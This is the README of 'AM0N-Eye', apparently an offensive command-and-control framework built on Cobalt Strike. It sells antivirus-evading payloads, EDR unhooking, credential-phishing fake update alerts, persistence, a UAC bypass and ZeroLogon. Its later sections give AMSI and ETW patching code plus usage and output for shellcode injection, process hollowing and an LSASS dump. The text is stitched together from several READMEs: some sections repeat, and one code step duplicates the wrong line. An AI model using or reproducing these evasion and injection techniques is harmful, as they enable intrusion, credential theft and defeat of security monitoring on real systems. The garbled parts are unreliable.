# AM0N-Eye
AM0N-Eye is the most advanced Red Team & Adversary Simulation Software in the current C2 Market. It can not only emulate different stages of an attacker killchain, but also provide a systematic timeline and graph for each of the attacks executed to help the Security Operations Team validate the attacks and improve the internal defensive mechanisms. AM0N-Eye comes prebuilt with several opsOpec features which can ease a Red Team’s task to focus more on the analytical part of an engagement instead of focusing or depending on Open source tools for post-exploitation. AM0N-Eye is a post-exploitation C2 in the end and however does not provide exploit generation features like metasploit or vulnerability scanning features like Nessus, Acunetix or BurpSuite. AM0N-Eye is a project based on a combination of different ideas and projects used by the threat actor where we observe a set of techniques to evasion EDR and AV while allowing the operator to continue using the tools The C2 standard is specifically designed to succeed in mature environments. Note here that they each have something that sets them apart, such as c2-backed shadow dedicated to Liunx and MacOS, brute ratel and its ability to evasion defensive machines,and also Sliver that support C2 over Mutual TLS (mTLS), WireGuard, HTTP(S), and DNS and are dynamically compiled with per-binary asymmetric encryption keys. Of course, I do not forget Cobaltsetrike, which is the most exploited here because it is the basis of this environment, especially the project that was uploading in the script console and it was the best environment to modify it and add all these features. So what if we combined all these features in one environment that works  With the mechanism together, with basic ttps added in any APT attack, and here I will know some TTPs of AM0N-Eye, but not all.

1. Linux, MacOS and windows c2 server
2. Fake Alert techniques
3. AV/EDR evasion techniques
4. shellcode Generator & obfuscatior
5. Persistence techniques
6. New BOF
7. AV/EDR Recon
8. PayloadGenerator Undetected by antivirus programs
9. custom malwares
10. New c2 profiles

![Screenshot from 2023-03-10 11-53-32](https://user-images.githubusercontent.com/121706460/226493992-1b6194b7-13a3-4ac5-bb3c-d473bbf0dd31.png)

<install>

chmod +x install.sh

chmod +x teamserver.AppImage

chmod +x st.AppImage
	
chmod +x start.sh   👈️ You can modify the start.sh file and put your ip in the run command to make the boot process easier
	
sudo ./install.sh

<start>

sudo ./teamserver.AppImage <yourip> password & ./st.AppImage
__________________________________________________________________________________________________________________________________________________________
##PayloadGenerator

Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener Undetected by antivirus programs
    
Creates /opt/amon-eye/Staged_Payloads, /opt/amon-eye/Stageless_Payloads
    
#Linux & MacOS C2 Server

A security framework for enterprises and Red Team personnel, supports AM0N-Eye penetration testing of other platforms (Linux / MacOS / ...), supports custom modules, and includes some commonly used penetration modules.

Lateral movement

    Generate beacon of Linux-bind / MacOS-bind type
    The target in the intranet runs ./MacOS-bind.beacon <port> to start the service
    Run connect <targetIP>:<port> in the session
    
Examples

The script interpreter such as bash / python / ruby / perl / php in the host can be called directly in the session to execute the script passed into the memory. There is no information in the process, all running content is transferred from the memory to the interpreter

    1.python c:\getsysteminfo.py
    2.python import base64;print base64.b64encode('whoami'); print 'a'*40
    3.php

Don't forget to Check C2 profiles in /AM0N-Eye/C2-Profiles/ to bypass network filters
To use a custom profile  you must start a AM0N-Eye team server and specify your profile at that tim 
Example ./teamserver [external IP] [password] [/path/to/my.profile] .

![Screenshot from 2023-03-09 13-47-25](https://user-images.githubusercontent.com/121706460/226558264-db460f06-92f1-445e-b428-80a13a69f487.png)

	
# Fake Alert update

to send toast notifications on behalf on an (installed) application or the computer itself. The user will be asked to supply credentials once they click on the notification toast. The second one is a AM0N-Eye module to launch the phishing attack on connected beacons and you can learn the types of victim's defense mechanisms and exploit this to issue an update alert or to take action

![Screenshot from 2023-02-21 02-42-37](https://user-images.githubusercontent.com/121706460/226552401-6666bc29-2b9b-4248-9056-faafe28af324.png)


#AV/EDR evasion

(AV/EDR evasion) is a payload creation framework for side loading (not injecting) into a legitimate Windows process (bypassing Application Whitelisting controls). Once the DLL loader is loaded into memory, it utilizes a technique to flush an EDR’s hook out of the system DLLs running in the process's memory. This works because we know the EDR’s hooks are placed when a process is spawned. (AV/EDR evasion) can target these DLLs and manipulate them in memory by using the API function VirtualProtect, which changes a section of a process’ memory permissions to a different value, specifically from Execute–Read to Read-Write-Execute.

When executed, (AV/EDR evasion) will copy the bytes of the system DLLs stored on disk in C:\Windows\System32\. These DLLs are stored on disk “clean” of EDR hooks because they are used by the system to load an unaltered copy into a new process when it’s spawned. Since EDR’s only hook these processes in memory, they remain unaltered. (AV/EDR evasion) does not copy the entire DLL file, instead only focuses on the .text section of the DLLs. This section of a DLL contains the executable assembly, and by doing this (AV/EDR evasion) helps reduce the likelihood of detection as re-reading entire files can cause an EDR to detect that there is a modification to a system resource. The data is then copied into the right region of memory by using each function’s offset. Each function has an offset which denotes the exact number of bytes from the base address where they reside, providing the function’s location on the stack.

To do this, (AV/EDR evasion) changes the permissions of the .text region of memory using VirtualProtect. Even though this is a system DLL, since it has been loaded into our process (that we control), we can change the memory permissions without requiring elevated privileges.

Once these the hooks are removed, (AV/EDR evasion) then utilizes custom System Calls to load and run shellcode in memory. (AV/EDR evasion) does this even after the EDR hooks are removed to help avoid detection by non-userland, hook-based telemetry gathering tools such as Event Tracing for Windows (ETW) or other event logging mechanisms. These custom system calls are also used to perform the VirtualProtect call to remove the hooks placed by EDRs, described above, to avoid detection by any EDR’s anti-tamper controls. This is done by calling a custom version of the VirtualProtect syscall, NtProtectVirtualMemory. (AV/EDR evasion) utilizes Golang to generate these loaders and then assembly for these custom syscall functions.

(AV/EDR evasion) loads the shellcode into memory by first decrypting the shellcode, which is encrypted by default using AES encryption with a decryption and initialization vector key. Once decrypted and loaded, the shellcode is then executed. Depending on the loader options specified (AV/EDR evasion) will set up different export functions for the DLL. The loaded DLL also does not contain the standard DLLmain function which all DLLs typically need to operate. The DLL will still execute without any issue because the process we load into will look for those export functions and not worry about DLLMain being there.

 ___________________________________________________________________
|                Various Out-Of-Box Evasion Capabilities            |
|-------------------------------------------------------------------|
|Evasion Capabilities 	x64 Support 	x86 |Support |x86 on Wow64  |
|Indirect System Calls 	Yes 	Yes 	Yes |   yes  |     yes      |
|Hide Shellcode Sections in Memory 	    Yes |	Yes  |	   Yes      |
|Multiple Sleeping Masking Techniques 	Yes |	yes  |	   yes      |
|Unhook EDR Userland Hooks and Dlls 	Yes |	yes  |	   yes      |
|LoadLibrary Proxy for ETW Evasion      Yes |	yes  |	   yes      |
|Thread Stack Encryption 	    Yes 	Yes |	Yes  |     yes      |
|Badger Heap Encryption      	Yes 	Yes |	Yes  |     yes      |
|Masquerade Thread Stack Frame 	Yes 	Yes |	Yes  |     yes      | 
|Hardware Breakpoint for AMSI/ETW Evasion   |	Yes  |	   Yes 	    |
|Reuse Virtual Memory For ETW Evasion 	Yes |	Yes  |	   Yes      |
|Reuse Existing Libraries from PEB 	    Yes |__ Yes  |	   Yes      |
|Secure Free Badger Heap for Volatility Evasion| Yes |	   Yes      |
|______________________________________________|_____|______________|

(AV/EDR evasion) contains the ability to do process injection attacks. To avoid any hooking or detection in either the loader process or the injected process itself, (AV/EDR evasion) first unhooks the loader process as it would normally, to ensure there are no hooks in the process. Once completed, the loader will then spawn the process specified in the creation command. Once spawned, the loader will then create a handle to the process to retrieve a list of loaded DLLs. Once it finds DLLs, it will enumerate the base address of each DLL in the remote process. Using the function WriteProcessMemory the loader will then write the bytes of the system DLLs stored on disk (since they are “clean” of EDR hooks) without the need to change the memory permissions first. (AV/EDR evasion) uses WriteProcessMemory because this function contains a feature primarily used in debugging where even if a section of memory is read-only, if everything is correct in the call to Write­Process­Memory, it will temporarily change the permission to read-write, update the memory section and then restore the original permissions. Once this is done, the loader can inject shellcode into the spawned process with no issue, as there are no EDR hooks in either process.
	
	
![Screenshot from 2023-03-21 04-48-45](https://user-images.githubusercontent.com/121706460/226556701-11379ed8-66de-4303-9daf-aca85f78af85.png)

	
#shellcode obfuscatior
 
Generates beacon stageless shellcode with exposed exit method, additional formatting, encryption, encoding, compression, multiline output, etc
shellcode transforms are generally performed in descending menu order
Requirements:
The optional AES encryption option uses a python script in the /assets folder
Depends on the pycryptodome package to be installed to perform the AES encryption

Install pycryptodome with pip depending on your python environment:

python -m pip install pycryptodome
python3 -m pip install pycryptodome
py -3 -m pip install pycryptodome
py -2 -m pip install pycryptodome

Listener:
Select a valid listener with the "..." button. Shellcode will be generated form this listener selection

Delivery:
Stageless (Staged not supported for the shellcode generator)

Exit Method:
process - exits the entire process that beacon is present in when the beacon is closed
thread - exits only the thread in which beacon is running when the beacon is closed

Local Pointers Checkbox:
May use if you are going to execute the shellcode from an existing Beacon
Generates a Beacon shellcode payload that inherits key function pointers from a same-arch parent Beacon

Existing Session:
Only used if the Local Pointers checkbox is checked
The parent Beacon session where the shellcode will pull session metadata
Shellcode should be run from within this Beacon session

x86 Checkbox:
Check to generate x86 shellcode, x64 is generated by default

Or Use Shellcode File:
Use an externally generated raw shellcode file in lieu of generating Beacon shellcode
This allows you to use previously exported shellcode files or output from other tools (Donut, msfvenom, etc)

Formatting:

raw - raw binary shellcode output, no formatting applied
hex - hex formatted shellcode output
0x90,0x90,0x90 - shellcode formatted into a C# style byte array (example format, does not prepend nulls)
0x90uy;0x90uy;0x90uy - shellcode formatted into a F# style byte array (example format, does not prepend nulls)
\x90\x90\x90 - shellcode formatted into a C\C++ style byte array (example format, does not prepend nulls)
b64 - option to base64 encode the shellcode early in the generation process (before any encryption)

XOR Encrypt Shellcode Checkbox:
Check to XOR encrypt the shellcode (only one encryption type can be selected at a time)

XOR Key(s):
Randomly generated and editable XOR key character(s) to use for encryption
Multiple characters will result in multiple rounds of XOR encryption (i.e. ABCD)

AES Encrypt Shellcode Checkbox:
Check to AES encrypt the shellcode (only one encryption type can be selected at a time)
Uses a python script to perform AES Block Cipher AES-CBC encryption
Shellcode is padded with \0 values to reach block size requirements
A randomly generated IV is prepended to the encrypted shellcode data

AES Key:
Randomly generated and editable AES key to use for encryption
32byte key is generated and preferred for 256bit encryption strength
Encryption key byte lengths accepted are 16, 24, and 32

Encoding/Compression:
none - No additional encoding or compression is done to the shellcode
b64 - base64 encode the shellcode
gzip then b64 - gzip compress then base64 the shellcode
gzip - gzip compress the shellcode
b64 then gzip - base64 then gzip compress the shellcode
b64 then 7xgzip - base64 then gzip compress the shellcode 7 times
	
![Screenshot from 2023-03-21 04-46-30](https://user-images.githubusercontent.com/121706460/226556899-c1253b00-8e08-469c-9a46-f1012b1f2795.png)


# Persistence threat _Menu
		
![Screenshot from Screencast 2023-03-22 08-14-28 mp4](https://user-images.githubusercontent.com/121706460/226905003-ff4a8f85-de5a-4ad1-840f-0a3f411db32c.png)
	
* (UserSchtasksPersist)

Schtasks Persistence that runs as current user for the selected beacon

Meant for quick user level persistence upon initial access


* (ServiceEXEPersist)

Admin Level Custom Service EXE Persistence
    
Runs as elevated user/SYSTEM for the selected beacon



* (WMICEventPersist)
    
Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon

Very syntax heavy, Test first before using on live targets


* (StartupGPOPersist)
   
Generates a Local GPO Entry in psscripts.ini to call a .ps1 script file for persistence on selected beacon
   
Calls back as SYSTEM
   
Check permissions with GPO Enumeration (Successful GroupPolicy Directory Listing) first before executing
   
Beacon execution will cause winlogon.exe to hang and the end user can't login. Once the new beacon checks in inject into another process and kill the original. Update to come out soon.


* (RegistryPersist)

Creates a Custom Registry Key, Value, Type, and Payload Location based on user input for selected beacon



* (HKCURunKeyPSRegistryPersist)

Creates two Custom Registry Run Key entries in HKCU
   
The Payload is a base64 encoded powershell payload based off your HTTP/HTTPS listener
 
#(Manual persistence)

is an extension for AM0N-Eye persistence by leveraging the execute_assembly function with the SharpStay .NET assembly.
handles payload creation by reading the template files for a specific execution type. 
The persistence menu will be added to the beacon. Due to the nature of how each technique is different there is only a GUI menu and no beacon commands. 

Available options:

 * ElevatedRegistryKey
 * UserRegistryKey
 * UserInitMprLogonScriptKey
 * ElevatedUserInitKey
 * ScheduledTask
 * ListScheduledTasks
 * ScheduledTaskAction
 * SchTaskCOMHijack
 * CreateService
 * ListRunningServices
 * WMIEventSub
 * GetScheduledTaskCOMHandler
 * JunctionFolder
 * StartupDirectory
 * NewLNK
 * BackdoorLNK
 * ListTaskNames
 
 Dependencies
  * Mono (MCS) for compiling .NET assemblies (Used with dynamic payload creation) 

    
##AVQuery

    Queries the Registry with powershell for all AV Installed on the target
    
    Quick and easy way to get the AV you are dealing with as an attacker
    
##checkmate request 
version of the checkmate request Web Delivery attack


    Stageless Web Delivery using checkmate.exe 
    
    Powerpick is used to spawn checkmate.exe to download the stageless payload on target and execute with rundll32.exe


##Curl-TLS  

simple web requests without establishing SOCKS PROXY. Example use case could be confirming outbound access to specific service before deploying a relay from [F-Secure's C3]


#AV/EDR Recon & EDR exact query
 
As a red-team practitioner, we are often using tools that attempt to fingerprint details about a compromised system, preferably in the most stealthy way possible. Some of our usual tooling for this started getting flagged by EDR products, due to the use of Windows CLI commands.
This aims to solve that problem by only probing the system using native registry queries, no CLI commands.


# Active-Evilentry 
job to execute as your current user context. This job will be executed every time the user logs in. Currently only works on Windows 7, 8, Server 2008, Server 2012.


# BypassUAC-eventvwr
 
silentcleanup UAC bypass that bypasses "always notify" aka the highest UAC setting, even on Windows


#info_Advanced

A common collection of OS commands, and Red Team Tips for when you have no Google or RTFM on hand.


#BOF & (New command)

    AV_Query                  Queries the Registry for AV Installed
    FindModule                Find loaded modules.
    FindProcHandle            Find specific process handles.
    amsi-inject               Bypass AMSI in a remote process with code injection.
    blockdlls                 Block non-Microsoft DLLs in child processes
    bypassuac-eventvwr        Bypass UAC using Eventvwr Fileless UAC bypass via. Powershell SMB Beacon
    cThreadHijack             cThreadHijack: Remote process injection via thread hijacking
    dllinject                 Inject a Reflective DLL into a process
    dllload                   Load DLL into a process with LoadLibrary()
    edr_query                 Queries the remote or local system for all major EDR products installed
    etw                       Start or stop ETW logging.
    execute-assembly          Execute a local .NET program in-memory on target
    info_RTFM                 A large repository of commands and red team tips
    kerberos_ccache_use       Apply kerberos ticket from cache to this session
    kerberos_ticket_purge     Purge kerberos tickets from this session
    kerberos_ticket_use       Apply kerberos ticket to this session
    process-hollowing         EarlyBird process hollowing technique - Spawns a process in a suspended state, injects shellcode, hijack main
    thread with APC, and execute shellcode.
    regenum                   System, AV, and EDR profiling via registry queries
    shinject                  Inject shellcode into a process
    show_beacon_downloads     Show all Downloads associated with your current Beacon.
    show_sync_location        Shows sync location for downloads.
    static_syscalls_apc_shspawnSpawn process and use syscalls to execute custom shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).
    static_syscalls_apc_spawn Spawn process and use syscalls to execute beacon shellcode launch with Nt functions (NtMapViewOfSection -> NtQueueUserApc).
    static_syscalls_dump      Use static syscalls to dump a given PID and save to disk
    static_syscalls_inject    Use static syscalls to execute CRT beacon shellcode launch with Nt functions.
    static_syscalls_shinject  Use static syscalls to execute custom shellcode launch with Nt functions.
    sync_all_beacon_downloads Sync all Downloads.
    sync_beacon_downloads     Sync all Downloads from current Beacon.
    syscalls_inject           Use syscalls from on-disk dll to execute CRT beacon shellcode launch with Nt functions.
    syscalls_shinject         Use syscalls from on-disk dll to execute custom shellcode launch with Nt functions.
    unhook                    remove hooks from DLLs in this process
    zerologon                 Reset DC machine account password with CVE-2020-1472
    
    
    __________________________________________________________________________________________________________________________________
    
    
## AM0N-Eye BOF - Inject AMSI Bypass
AM0N-Eye Beacon Object File (BOF) that bypasses AMSI in a remote process with code injection.

### What does this do?
##### 1. Use supplied PID argument to get a handle on the remote process
```c
hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
```
##### 2. Load AMSI.DLL into beacons memory and get the address of AMSI.AmsiOpenSession
```c
hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
```
+ Both beacon and the target process will both have the same address for the symbol.
+ If AMSI.DLL does not exist in the remote process, running this may crash the target process.
##### 3. Write the AMSI bypass to the remote processes memory
```c
unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
BOOL success = KERNEL32$WriteProcessMemory(hProc, amsiOpenSessAddr, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
```

### Method = AMSI.AmsiOpenSession
+ Uses the AMSI bypass technique taught in Offensive Security's PEN-300/OSEP (Evasion Techniques and Breaching Defenses) course.
  - https://www.offensive-security.com/pen300-osep/


### Compile with x64 MinGW:
```bash
x86_64-w64-mingw32-gcc -c amsi-inject.c -o amsi-inject.o
```
### Run from AM0N-Eye Beacon Console
```bash
beacon> amsi-inject <PID>
```

### To Do List
+ Check that AMSI.DLL exists in remote process before injection
+ Add other AMSI bypasses to inject
+ Support x86


## ETW Patching BOF

Simple Beacon object file to patch (and revert) the EtwEventWrite function in ntdll.dll to degrade ETW based logging.


## Compile

```
x86_64-w64-mingw32-gcc -c etw.c -o etw.x64.o
i686-w64-mingw32-gcc -c etw.c -o etw.x86.o
```

## Usage

`etw start` and `etw stop` commands.

Patch bytes returned to confirm activity.

```
beacon> help etw
etw stop - patch out EtwEventWrite in Ntdll.dll to prevent ETW-based logging.
etw start - patch back in EtwEventWrite in Ntdll.dll to restart ETW-based logging.

beacon> etw stop
[*] Running ETW patching BOF (@ajpc500)
[+] host called home, sent: 1391 bytes
[+] received output:
Action: stop
Working with 32-bit.
[+] received output:
c2
[+] received output:
14
[+] received output:
0
[+] received output:
0
```

### How do I set this up? ###

We will not supply compiled binaries. You will have to do this yourself:
* Clone this repository.
* Make sure you have the Mingw-w64 compiler installed. On Mac OSX for example, you can use the ports collection to install Mingw-w64 (``sudo port install mingw-w64``).
* Run the ``make`` command to compile the Beacon object file.
* Within a AM0N-Eye beacon context use the ``FindProcHandle`` or ``FindModule`` command with the required parameters (e.g. module or process name).


### BUILDING: ###
1. On a Windows machine, open a `x64 Native Tools Command Prompt for VS` prompt. This can be done by pressing the Windows key and typing `x64 Native Tools` and selecting the prompt.
2. Change directory to `C:\path\to\cThreadHijack`.
3. `nmake -f Makefile.msvc build`

### USAGE: ###
`cThreadHijack PID LISTENER_NAME`

```
beacon> cThreadHijack 7340 TESTING
[+] host called home, sent: 268433 bytes
[+] received output:
[+] Target process PID: 7340

[+] received output:
[+] Opened a handle to PID 7340

[+] received output:
[+] Found a thread in the target process! Thread ID: 10212

[+] received output:
[+] Suspending the targeted thread...

[+] received output:
[+] Wrote Beacon shellcode to the remote process!

[+] received output:
[+] Virtual memory for CreateThread and NtContinue routines allocated at 0x201f4ab0000 inside of the remote process!

[+] received output:
[+] Size of NtContinue routine: 64 bytes
[+] Size of CONTEXT structure: 1232 bytes

[+] Size of stack alignment routine: 4
[+] Size of CreateThread routine: 64
[+] Size of shellcode: 261632 bytes

[+] received output:
[+] Wrote payload to buffer to previously allocated buffer inside of!

[+] received output:
[+] Current RIP: 0x7ffa55df69a4

[+] received output:
[+] Successfully pointed the target thread's RIP register to the shellcode!

[+] received output:
[+] Current RIP: 0x201f4ab0000

[+] received output:
[+] Resuming the thread! Please wait a few moments for the Beacon payload to execute...
```

## process-hollowing - AM0N-Eye BOF

Beacon Object File (BOF) that spawns an arbitrary process from beacons memory in a suspended state, inject shellcode, hijack main thread with APC, and execute shellcode; using the Early Bird injection method taught 

### Run from AM0N-Eye Beacon Console

```bash
beacon> help process-hollowing
Synopsis: process-hollowing /path/to/process-hollowing/pe /local/path/to/shellcode.bin
beacon> process-hollowing svchost.exe /Users/bobby.cooke/popCalc.bin
[*] process-hollowing - EarlyBird Remote Process Shellcode Injector
[*] Reading shellcode from: /Users/bobby.cooke/popCalc.bin
[+] Success - Spawned process for svchost.exe at 5464 (PID)
[+] Success - Allocated RE memory in remote process 5464 (PID) at: 0x000001A83BEC0000
[+] Success - Wrote 280 bytes to memory in remote process 5464 (PID) at 0x000001A83BEC0000
[+] Success - APC queued for main thread of 5464 (PID) to shellcode address 0x000001A83BEC0000
[+] Success - Your thread was resumed and your shellcode is being executed within the remote process!
```

### Compile with x64 MinGW (only tested from macOS):
```bash
x86_64-w64-mingw32-gcc -c process-hollowing.x64.c -o process-hollowing.x64.o
```

### To Do List
+ Refactor code to make it more modular/clean
- Combine this with the PPID spoofing and blockdll features of SPAWN


## Section Mapping Process Injection (secinject): AM0N-Eye BOF

Beacon Object File (BOF) that leverages Native APIs to achieve process injection through memory section mapping. 
one to inject beacon shellcode for a selected listener into the desired process, and one to inject the user's desired shellcode - loaded from a bin file - into the desired process.  These are *sec-inject* and *sec-shinject* respectively.

- Currently, this is only implemented for x64 processes.

### How to Make
```
cd secinject/src
make
```

### How to Use
#### Injecting Beacon
```
sec-inject PID LISTENER-NAME
```

#### Injecting Other Shellcode
```
sec-shinject PID /path/to/bin
```

## Section Mapping Process Injection (secinject): AM0N-Eye BOF

Beacon Object File (BOF) that leverages Native APIs to achieve process injection through memory section mapping. 
one to inject beacon shellcode for a selected listener into the desired process, and one to inject the user's desired shellcode - loaded from a bin file - into the desired process.  These are *sec-inject* and *sec-shinject* respectively.

- Currently, this is only implemented for x64 processes.

### How to Make
```
cd secinject/src
make
```

### How to Use
#### Injecting Beacon
```
sec-inject PID LISTENER-NAME
```

#### Injecting Other Shellcode
```
sec-shinject PID /path/to/bin
```


## Compile

```
make
```

## Usage

- `static_syscalls_dump PID output_file` - Creates a dump for the specified PID at the supplied location.
- `static_syscalls_dump PID` - Not providing an output location will default to "C:\Windows\Temp\PID-[target_pid].dmp" 

> NOTE: BOF is for 64-bit use only.


### Example Output
```
beacon> static_syscalls_dump 4337 C:\Users\user\Desktop\lsass.dmp
[*] Syscalls Process Dump BOF (@ajpc500)
[+] host called home, sent: 8904 bytes
[+] received output:
Using Syscalls for Windows 10 or Server 2016, build number 19041
Dumping PID 4337 to file: C:\Users\user\Desktop\lsass.dmp

[+] received output:
Success!
```

## Compile

```
make
```

## Usage

- `static_syscalls_inject PID listener_name` - Injects shellcode for beacon into target PID. 
- `static_syscalls_shinject PID path_to_bin` - Injects custom shellcode into target PID.

> NOTE: BOF is for 64-bit use only.

### Custom shellcode
```
beacon> static_syscalls_shinject 4052 C:\Users\user\shellcode\calc.bin
[*] Static Syscalls Shellcode Injection BOF (@ajpc500)
[*] Reading shellcode from: C:\Users\user\shellcode\calc.bin
[+] host called home, sent: 4824 bytes
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> static_syscalls_inject 4972 http
[*] Static Syscalls Shellcode Injection BOF (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266180 bytes
[+] received output:
Shellcode injection completed successfully!
```


## Compile

```
make
```

## Usage

- `syscalls_inject PID listener_name` - Injects shellcode for beacon into target PID. 
- `syscalls_shinject PID path_to_bin` - Injects custom shellcode into target PID.

> NOTE: BOF is for 64-bit use only.

### Custom shellcode
```
beacon> syscalls_shinject 2268 C:\Users\user\Desktop\beacon64.bin
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Reading shellcode from: C:\Users\user\Desktop\beacon64.bin
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```

### Beacon shellcode
```
beacon> syscalls_inject 13764 http
[*] Syscalls Shellcode Inject (@ajpc500)
[*] Using http listener for beacon shellcode generation.
[+] host called home, sent: 266159 bytes
[+] received output:
Shellcode injection completed successfully!
```


# BOF Template

This repository is meant to host the core files needed to create a Beacon Object File for use with AM0N-Eye.

A Beacon Object File (BOF) is a compiled C program, written to a convention that allows it to execute within a Beacon process and use internal Beacon APIs. BOFs are a way to rapidly extend the Beacon agent with new post-exploitation features.

## beacon.h

beacon.h contains definitions for several internal Beacon APIs. The function go is similar to main in any other C program. It's the function that's called by inline-execute and arguments are passed to it. BeaconOutput is an internal Beacon API to send output to the operator.

## examples
This directory contains examples BOFs.  The directory contains the following:

#### demo
Directory containing the example demo BOF which demonstrates items that are now supported in AM0N-Eye version 4.7
- demo/build.bat - build script for the Microsoft Visual Studio compiler.
- demo/build.sh  - build script for the MinGW compiler.
- demo/demo.c   - source code for the demo example.
- execute the demo command.

Use:
- Use one of the build scripts to build the object file.
- Execute the `demo` command in the beacon console.

#### hello
Directory containing the example hello world BOF from the documentation.
- hello/build.bat - build script for the Microsoft Visual Studio compiler.
- hello/build.sh  - build script for the MinGW compiler.
- hello/hello.c   - source code for the hello world example.
- execute the hello command.

Use:
- Use one of the build scripts to build the object file.
- Execute the `hello` command in the beacon console.

#### helloWorld
Directory containing the example helloWorld BOF from the documentation.
- helloWorld/build.bat - build script for the Microsoft Visual Studio compiler.
- helloWorld/build.sh  - build script for the MinGW compiler.
- helloWorld/hello.c   - source code for the example.

Use:
- Use one of the build scripts to build the object file.
- Use the inline-execute command in the beacon console.

Examples:
````
  inline-execute /base/path/examples/helloWorld/hello.x64.o these are args
  inline-execute /base/path/examples/helloWorld/hello.x86.o these are args
````

## tests

The tests directory contains examples for using the internal Beacon APIs.  The directory contains the following:
- build.sh            - builds the object files located in tests/src. Requires mingw-w64 cross-compiler package
- src directory       - Contains example source files for using the internal Beacon APIs.

How to execute the tests:
1. Build the object files with the build.sh script in the tests directory.
2. Start a team server and client
3. Generate and start a beacon on a test system.
4. In the beacon console execute: run_boff_tests "<user_string>" \<numeric\> "<numeric_string>"

where:  
&emsp; user_string is any quoted input string  
&emsp; numeric is any signed short or integer value  
&emsp; numeric_string is any quoted numeric string (only used in testBeaconDataLongLong) 



Run 'unhook' from Beacon

To build:

x86: Open Visual Studio x86 Native Tools Command Prompt and type 'make'
x64: Open Visual Studio x64 Croos Tools Command Prompt and type 'make'
```

##Curl-TLS

##Compile
```
make
```
### Examples

Simple request to confirm a 200 response:

```
beacon> curl https://f-secure.com
[*] Running Simple Web Request Utility
[+] host called home, sent: 2882 bytes
[+] received output:
GET f-secure.com:443 
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: */*

[+] received output:
Response Code: 200
```

Simple GET request that prints output (print is useful for calls to web APIs, a bad idea against a Javascript-heavy webpage!):

```
beacon> curl http://example.com 80 GET --show
[*] Running Simple Web Request Utility
[+] host called home, sent: 2880 bytes
[+] received output:
GET example.com:80 
User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36
Accept: */*

[+] received output:
Response Code: 200

[+] received output:
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
...
```
